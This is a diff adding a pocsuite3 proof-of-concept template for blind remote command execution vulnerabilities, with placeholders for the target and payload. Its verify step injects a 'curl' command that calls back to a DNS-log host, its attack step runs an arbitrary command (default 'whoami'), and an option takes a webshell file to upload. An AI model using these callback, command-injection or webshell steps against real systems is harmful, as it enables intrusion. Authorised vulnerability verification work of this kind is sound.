@@ -1,0 +1,139 @@
+from pocsuite3.api import Output, POCBase, logger, VUL_TYPE, POC_CATEGORY, OrderedDict, OptString
+from pocsuite3.api import register_poc,random_str
+from pocsuite3.api import requests
+import random
+import string
+
+#请自行查找URL服务进行重构
+class Dnslog:
+    def __init__(self, send_url='', check_url='') -> None:
+        self.send_url = send_url
+        self.check_url = check_url
+        if self.send_url and self.check_url:
+            self.protocol = 'https'
+            self.random_key = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba123456789', 32))
+            self.dnssubdomain = f"{send_url.replace(self.protocol + '://', '')}?id={self.random_key}"
+            self.dnsurl = f"{send_url}?id={self.random_key}"
+        else:
+            self.protocol = 'http'
+            self._get_dns_domain_api = ''  # 获取域名
+            self._check_dns_record_api = ''  # 查询dns解析
+            self._headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}
+            self._dns = requests.session()
+            self.dnssubdomain = self._dns.get(self._get_dns_domain_api).text
+            self.dnsurl = f"http://{self.dnssubdomain}"
+        logger.info('dnsdomain: ' + self.dnssubdomain)
+
+    def getrecords(self):
+        if self.send_url and self.check_url:
+            result = requests.get(f'{self.check_url}?id={self.random_key}').text
+        else:
+            random_key = self.dnssubdomain.split('.')[0]
+            data = {'random_key': random_key}
+            result = self._dns.post(self._check_dns_record_api, json=data, headers=self._headers).text
+        if 'not_exist' not in result:
+            return True
+        else:
+            return False
+
+
+class ${CLASSNAME}(POCBase):
+    # 非必填的字段，需保留字段名称，值为空
+    vulID = '${VUL_ID}'  # 必填，poc id，保持不变即可，后端会自动填写
+    version = '1.0'  # 必填，poc版本，从1开始
+    author = ['360漏洞云']  # 必填，作者
+    vulDate = '${VUL_DATE}'  # 必填，漏洞发布时间
+    createDate = '${CREATEDATE}'  # 必填，poc创建时间
+    updateDate = '${UPDATEDATE}'  # 必填，poc更新时间
+
+    name = '${APP_NAME}_${VUL_NAME}_${VUL_NUM}'  # 必填，poc名称，格式 [app名称]_[漏洞名称]_[cve/cnvd号]
+    CVE = '${CVE_NUM}'  # 非必填，cve号，大写
+    CNVD = ''  # 非必填，cnvd号，大写
+    vulType = VUL_TYPE.${VUL_TYPE}  # 必填，漏洞类型，参考 pocsuite3 VUL_TYPE的取值范围
+    category = POC_CATEGORY.${POC_CATEGORY}  # 必填，漏洞分类，参考 pocsuite3 POC_CATEGORY的取值范围
+    severity = '${SEVERITY}'  # 必填，严重等级，取值范围 Critical , High , Medium, Low
+    reqAuth = ${REQAUTH}  # 必填，boolen值，该漏洞验证或利用是否需要先认证
+
+    appName = '${APP_NAME}'  # 必填，该漏洞对应的应用名称
+    fingerprintNames = ['${FINGERPRINT_NAMES}']  # 必填，当命中哪些指纹后，可使用该poc。列表中是指纹的名称
+    app_main_port = ${APP_MAIN_PORT}  # 必填，该应用的默认配置端口，用于快速扫描模式，若无法确认可以写80
+    appVersion = '${APPVERSION}'  # 必填，漏洞影响的版本号
+
+    appPowerLink = '${APP_POWER_LINK}'  # 非必填，应用厂商链接
+    references = ['${REFERENCES}']  # 非必填，漏洞相关参考链接
+    desc = '''${DESC}'''  # 必填，漏洞描述，需尽量详细，参考cnnvd的写法 [应用简介]，[漏洞简介]
+    suggest = '''${SUGGEST}'''  # 必填，修复建议
+    hasExp = ${HASEXP}  # 必填，boolen值，是否包含exp
+    targets = ['${TARGETS}']  # 必填，该Poc适用的目标，string类型 https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
+    suricata_rules = 'alert tcp any any -> any any (msg:"${CLASSNAME}"; content:"${SURICATA_RULES}";sid:1;classtype:aes; metadata:aes_team_rules;)'  # 必填，suricata格式的检测规则
+
+    def _options(self):
+        o = OrderedDict()
+        ## verify proxy feature  这三个参数是必须要有的，用于在目标无法出网的情况下的内网无回显漏洞验证，verify_send_url用于触发目标http请求，verify_check_url用于验证无回显漏洞，verify_proxy用于目标无法直连server的情况下走我们搭建的代理
+        # o['verify_proxy'] = OptString('', description='对于无回显poc, 验证时curl要使用的socks5代理')
+        # o['verify_send_url'] = OptString('', description='对于无回显poc, 验证时用于访问的url')
+        # o['verify_check_url'] = OptString('', description='对于无回显poc, 验证时用于检查的url')
+        ## verify proxy feature
+
+        ${COMMAND}o['command'] = OptString('whoami', description='攻击时自定义命令')
+        # o["server_ip"] = OptString("", description='rmi、ldap等服务器的ip地址，用于特定场景下的attack或verify')
+        # o["server_port"] = OptString("", description='rmi、ldap等服务器的端口，用于特定场景下的attack或verify')
+        ${FILE_PATH}o["file_path"] = OptString("", description='待上传文件的绝对路径，一般是webshell文件，用于文件上传的attack')
+        return o
+
+    def _exploit(self, param=''):
+        # 使用 self._check() 方法检查目标是否存活，是否是关键词蜜罐。
+        #if not self._check(dork=''):
+        #    return False
+        url= self.url.rstrip("/")
+        timeout = ${TIMEOUT}
+        payload_url = url + "${URI}"
+        headers = ${HEADERS}
+        payload_data = ${PAYLOAD_DATA}
+        try:
+            res=requests.${METHOD}(payload_url,data=payload_data,headers=headers,timeout=timeout, verify=False,allow_redirects = False)
+            logger.debug(res.text)
+            data = res.status_code
+            return data
+        except Exception as e:
+            logger.error(f"connect target '{self.url} failed!'")
+
+    def _verify(self):
+        result = {}
+        self.dnslog=Dnslog()
+        url = self.url.rstrip("/")
+        param = f"curl {self.dnslog.dnsurl}"
+        try:
+            res = self._exploit(param)
+            if self.dnslog.getrecords():
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = url
+        except Exception as e:
+            pass
+        return self.parse_output(result)
+
+    def _attack(self):
+        param = self.get_option('command')
+        try:
+            res = self._exploit(param)
+            result = {}
+            url = self.url.rstrip("/")
+            result['AttackInfo'] = {}
+            result['AttackInfo']['URL'] = url
+            result['AttackInfo']['Stdout'] = '该漏洞无回显，请自行确认漏洞是否成功执行'
+        except Exception as e:
+            pass
+        return self.parse_output(result)
+
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail('target is not vulnerable')
+        return output
+
+
+register_poc(${CLASSNAME})
+
